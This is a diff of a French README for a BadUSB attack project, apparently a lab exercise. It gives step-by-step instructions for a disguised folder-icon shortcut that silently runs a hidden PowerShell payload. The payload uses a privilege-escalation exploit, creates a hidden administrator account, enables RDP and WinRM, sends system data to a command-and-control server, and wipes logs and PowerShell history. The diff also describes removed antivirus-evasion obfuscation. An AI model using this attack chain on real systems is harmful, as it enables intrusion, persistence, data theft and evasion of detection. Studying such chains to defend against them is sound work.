@@ -14,10 +14,10 @@
 Projet_BadUSB_Attack/
 ├── partie1/                    # Charge utile (attaque)
 │   ├── payload/
-│   │   ├── autorun.inf         # AutoRun – déclenche launcher.vbs à l'insertion
-│   │   ├── launcher.vbs        # Lanceur silencieux VBScript
-│   │   ├── payload.ps1         # Payload principal (version lisible)
-│   │   ├── payload_obfusque.ps1# Payload obfusqué (évasion AV)
+│   │   ├── autorun.inf         # Repli AutoRun (systèmes anciens uniquement)
+│   │   ├── create_shortcut.vbs # Génère Documents.lnk sur la clé USB
+│   │   ├── launcher.vbs        # Lanceur silencieux (invoqué par le .lnk)
+│   │   ├── payload.ps1         # Payload unique (RedSun LPE + admin + C2)
 │   │   └── RedSun.exe          # LPE exploit (élévation de privilèges)
 │   └── serveur_c2/
 │       ├── server.py           # Serveur C2 Flask (attaquant)
@@ -35,74 +35,88 @@ Projet_BadUSB_Attack/
 | Étape | Action | Délai |
 |-------|--------|-------|
 | 1 | Insertion de la clé USB dans le port | T+0 s |
-| 2 | Windows lit `autorun.inf` → `launcher.vbs` s'exécute | T+0–1 s |
-| 3 | `payload.ps1` s'exécute dans le contexte de l'utilisateur courant | T+1 s |
-| 4 | Anti-analyse + élévation silencieuse via **RedSun** (LPE) | T+1–6 s |
-| 5 | Création du compte administrateur caché | T+7 s |
-| 6 | Activation RDP + WinRM + règles pare-feu | T+8–11 s |
-| 7 | Collecte des informations système | T+12 s |
-| 8 | Exfiltration vers le serveur C2 (`10.10.1.13:8080`) | T+13–16 s |
-| 9 | Nettoyage des journaux | T+16–18 s |
-| 10 | Retrait de la clé USB | ≤ T+20 s |
+| 2 | La victime double-clique sur `Documents.lnk` (icône dossier) | T+0–5 s |
+| 3 | `launcher.vbs` s'exécute silencieusement → `payload.ps1` lancé | T+5–6 s |
+| 4 | Anti-analyse + RedSun LPE → payload relancé en SYSTEM | T+6–16 s |
+| 5 | Création du compte administrateur caché (`svc_XXXXXX`) | T+17 s |
+| 6 | Activation RDP + WinRM + règles pare-feu (FR + EN) | T+18–21 s |
+| 7 | Collecte des informations système | T+22 s |
+| 8 | Exfiltration vers le serveur C2 (`10.10.1.32:8080`) | T+23–26 s |
+| 9 | Nettoyage des journaux | T+26–28 s |
+| 10 | Retrait de la clé USB | ≤ T+30 s |
 
-> **Remarque – AutoRun sur Windows 10/11 :** depuis Windows 7 KB971029,
-> `autorun.inf` est **désactivé** pour les supports USB sur toutes les
-> éditions modernes. Le déclenchement réel repose donc sur un clic
-> utilisateur (ouverture de `launcher.vbs`) ou sur des mécanismes
-> alternatifs silencieux :
+> **Déclenchement – `.lnk` double-clic (mécanisme actuel) :** La clé USB
+> expose un unique fichier visible, `Documents.lnk`, dont l'icône imite un
+> dossier Windows. Un double-clic de la victime déclenche silencieusement
+> `launcher.vbs` → `payload.ps1` sans aucun terminal visible.
 >
-> - **Fichier `.library-ms` malveillant** compressé dans une archive
->   ZIP/RAR placée sur la clé. Dès que l'Explorateur Windows affiche le
->   contenu, il interprète automatiquement le fichier `.library-ms` et
->   déclenche une authentification SMB – permettant la capture de hashs
->   NTLM sans aucun clic.
-> - **Raccourci `.lnk`** exploitant la vulnérabilité
->   [CVE-2025-9491](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-9491)
->   pour masquer la commande réelle exécutée à l'ouverture du fichier.
+> `autorun.inf` est conservé comme **repli uniquement** pour les systèmes
+> Windows 7/8 non patchés (KB971029) où l'AutoRun USB est encore actif.
+>
+> Alternatives zéro-clic à explorer :
+> - **Fichier `.library-ms` malveillant** dans une archive ZIP/RAR : dès que
+>   l'Explorateur affiche le contenu, Windows déclenche une authentification
+>   SMB → capture de hashs NTLM.
+> - **Raccourci `.lnk` exploitant [CVE-2025-9491](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-9491)**
+>   pour masquer la commande réelle exécutée à l'ouverture.
 
 ### Déclenchement depuis un compte utilisateur standard
 
 Le payload est conçu pour s'exécuter **depuis un compte utilisateur standard
-(non élevé)**. L'élévation de privilèges est obtenue via l'exploit
-**RedSun** (Local Privilege Escalation) :
+(non élevé)**. L'élévation de privilèges est obtenue via **RedSun** (LPE) ;
+le payload se **relance automatiquement** en SYSTEM via la commande passée en
+argument à RedSun.exe.
 
-1. `launcher.vbs` lance `payload.ps1` dans le contexte de l'utilisateur courant.
-2. Le payload détecte qu'il ne tourne pas en mode administrateur.
-3. Il lance `RedSun.exe` (présent à la racine de la clé USB) en arrière-plan.
-4. RedSun exploite une vulnérabilité locale pour élever les droits au niveau SYSTEM.
+1. `Documents.lnk` → `launcher.vbs` → `payload.ps1` (compte standard).
+2. `Test-Admin` → **NON** : RedSun est invoqué avec `powershell.exe … -File payload.ps1` comme argument.
+3. RedSun élève en SYSTEM et exécute la commande reçue.
+4. `payload.ps1` s'exécute une seconde fois, `Test-Admin` → **OUI** : poursuite vers les étapes 3-6.
 
 ```
 [Compte utilisateur standard]
        │
        ▼
-[launcher.vbs → payload.ps1 lancé]
+[Documents.lnk → launcher.vbs → payload.ps1]
        │
        ├─ Test-Admin → NON
        │
        ▼
-[RedSun.exe exécuté (LPE → SYSTEM)]
+[RedSun.exe "powershell.exe … -File payload.ps1"]
        │
-       ▼
-[payload.ps1 s'exécute avec droits élevés]
+       ▼  (RedSun élève en SYSTEM et relance le script)
+[payload.ps1 – 2e exécution, Test-Admin → OUI]
        │
-       ├─ Création compte backdoor (svc_XXXXXX)
-       ├─ Activation RDP + WinRM
-       └─ Exfiltration → 10.10.1.13:8080
+       ├─ Création compte administrateur (svc_XXXXXX)
+       ├─ Activation RDP + WinRM (noms FR + EN)
+       └─ Exfiltration → 10.10.1.32:8080
 ```
 
 ### Fichiers à copier sur la clé USB
 
 ```
 Racine de la clé USB/
-├── autorun.inf             ← déclencheur (open=launcher.vbs)
-├── launcher.vbs            ← lanceur silencieux
-├── payload.ps1             ← charge utile
-└── RedSun.exe              ← exploit LPE (requis pour l'élévation)
+├── Documents.lnk           ← SEUL fichier VISIBLE (icône dossier)
+├── autorun.inf             ← repli (Win7/8 non patchés) – masqué
+├── launcher.vbs            ← lanceur silencieux – masqué
+├── payload.ps1             ← charge utile – masqué
+└── RedSun.exe              ← exploit LPE – masqué
 ```
+
+> Les fichiers techniques (`launcher.vbs`, `payload.ps1`, `RedSun.exe`,
+> `autorun.inf`) doivent être masqués avec `attrib +H +S <fichier>` ou via
+> l'Explorateur → Propriétés → ☑ Caché. Seul `Documents.lnk` reste visible.
 
 ### Déploiement
 
-**Étape 1 – Démarrer le serveur C2 sur la machine attaquante (10.10.1.13)**
+**Étape 1 – Configurer `payload.ps1`**
+
+Ouvrir `partie1/payload/payload.ps1` et modifier :
+
+```powershell
+$c2Base = "http://<IP_KALI>:8080"   # IP de la machine attaquante
+```
+
+**Étape 2 – Démarrer le serveur C2 sur la machine attaquante**
 
 ```bash
 cd partie1/serveur_c2
@@ -110,17 +124,24 @@ pip install -r requirements.txt
 python server.py --host 0.0.0.0 --port 8080
 ```
 
-Interface de suivi : `http://10.10.1.13:8080/status`
+Interface de suivi : `http://<IP_KALI>:8080/status`
 
-**Étape 2 – Préparer la clé USB**
+**Étape 3 – Préparer la clé USB**
 
-Copier `autorun.inf`, `launcher.vbs`, `payload.ps1` (ou `payload_obfusque.ps1`)
-**et `RedSun.exe`** à la racine de la clé USB.
+1. Copier sur la clé : `autorun.inf`, `launcher.vbs`, `payload.ps1`, `RedSun.exe`.
+2. **Générer le raccourci** : brancher la clé, noter sa lettre de lecteur (ex. `D:\`),
+   ouvrir `create_shortcut.vbs`, modifier la constante `USB_ROOT`,
+   puis double-cliquer → `Documents.lnk` est créé à la racine.
+3. **Masquer les fichiers techniques** :
+   ```bat
+   attrib +H +S D:\launcher.vbs D:\payload.ps1 D:\RedSun.exe D:\autorun.inf
+   ```
+4. Vérifier : seul `Documents.lnk` (icône dossier) est visible depuis l'Explorateur.
 
-**Étape 3 – Insérer la clé USB dans la machine cible**
+**Étape 4 – Insérer la clé USB dans la machine cible**
 
-L'utilisateur cible n'a pas besoin de droits administrateur. Le payload
-lance RedSun automatiquement pour s'élever.
+La victime voit un dossier « Documents ». Un double-clic déclenche le payload
+silencieusement. Aucun droit administrateur n'est requis de la part de la victime.
 
 ### Fonctionnalités du payload
 
@@ -136,16 +157,19 @@ lance RedSun automatiquement pour s'élever.
 
 #### Élévation de privilèges – RedSun LPE
 
-**RedSun** est un exploit de type Local Privilege Escalation (LPE) :
-- Lance `RedSun.exe` en arrière-plan (`-WindowStyle Hidden`)
-- Exploite une vulnérabilité locale pour obtenir les droits SYSTEM/Administrateur
+**RedSun** est un exploit de type Local Privilege Escalation (LPE) exploitant
+la logique de restauration de Windows Defender :
+- Invoqué avec la commande PowerShell à exécuter en SYSTEM en argument
+- Élève silencieusement et **relance automatiquement** `payload.ps1` en SYSTEM
 - Ne nécessite aucune interaction de l'utilisateur
 
 #### Création du compte administrateur
 
 - Nom généré aléatoirement : `svc_<6 caractères alphanumériques>`
 - Mot de passe de 18 caractères (alphanumérique + spéciaux)
-- Ajouté aux groupes `Administrators` et `Remote Desktop Users`
+- Création via `New-LocalUser` (avec repli sur `net user`)
+- Ajouté aux groupes Administrateurs **et** Remote Desktop Users
+  (noms français ET anglais pour couvrir toutes les localisations Windows)
 - Caché de l'écran de connexion via
   `HKLM:\...\Winlogon\SpecialAccounts\UserList`
 
@@ -159,7 +183,12 @@ lance RedSun automatiquement pour s'élever.
 
 #### Exfiltration des données
 
-Données transmises en JSON via HTTP POST vers `http://10.10.1.13:8080/collect` :
+3 canaux tentés dans l'ordre :
+1. **AES-256-GCM** vers `/enc` (si clé `$c2AesKeyHex` configurée)
+2. **POST JSON** en clair vers `/collect` ← canal principal
+3. **Base64 GET** vers `/b64?d=…` ← repli
+
+Données transmises :
 
 ```json
 {
@@ -177,8 +206,6 @@ Données transmises en JSON via HTTP POST vers `http://10.10.1.13:8080/collect` 
 }
 ```
 
-Méthode de repli : encodage Base64 dans un paramètre GET (`/b64?d=<base64>`).
-
 #### Nettoyage des traces
 
 - Effacement des journaux d'événements (`System`, `Application`, `Security`,
@@ -186,17 +213,6 @@ Méthode de repli : encodage Base64 dans un paramètre GET (`/b64?d=<base64>`).
 - Suppression de l'historique PowerShell (`ConsoleHost_history.txt`)
 - Suppression des fichiers Prefetch PowerShell
 - Désactivation de la journalisation PowerShell (ScriptBlock + Transcription)
-
-### Version obfusquée (`payload_obfusque.ps1`)
-
-Techniques appliquées :
-- **Encodage Base64** des chaînes sensibles (chemins de registre, noms de
-  commandes, noms de processus cibles)
-- **Concaténation de chaînes** pour briser les signatures AV
-  (`g1 "Get-" "Process"` → `Get-Process`)
-- **Noms de variables obfusqués** (`$_vp`, `$_u`, `$_pw`, etc.)
-- **Décodage dynamique** via la fonction `g0` (`[Convert]::FromBase64String`)
-- **Substitution** des cmdlets par des appels via `&(g1 …)`
 
 ### Serveur C2 (`server.py`)
 
@@ -294,7 +310,7 @@ Enter-PSSession -ComputerName <IP_CIBLE> -Credential $cred
 ### MITRE ATT&CK
 
 - [T1052.001](https://attack.mitre.org/techniques/T1052/001/) – Exfiltration Over USB
-- [T1548.002](https://attack.mitre.org/techniques/T1548/002/) – Bypass User Account Control (fodhelper)
+- [T1548.002](https://attack.mitre.org/techniques/T1548/002/) – Abuse Elevation Control Mechanism (RedSun LPE via Defender)
 - [T1078.003](https://attack.mitre.org/techniques/T1078/003/) – Valid Accounts: Local Accounts
 - [T1021.001](https://attack.mitre.org/techniques/T1021/001/) – Remote Services: RDP
 - [T1059.001](https://attack.mitre.org/techniques/T1059/001/) – Command and Scripting Interpreter: PowerShell
